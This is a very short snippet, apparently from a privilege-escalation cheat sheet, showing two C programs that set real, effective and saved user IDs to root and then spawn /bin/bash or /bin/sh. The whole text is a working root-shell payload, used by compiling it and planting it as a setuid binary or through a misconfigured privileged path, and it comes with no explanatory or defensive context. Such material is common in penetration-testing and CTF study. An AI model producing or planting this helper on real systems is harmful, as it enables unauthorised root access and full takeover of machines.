**For /bin/bash:**
```c
int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}
```

**For /bin/sh:**
```c
int main(void){

setresuid(0, 0, 0);

system("/bin/sh");

}
```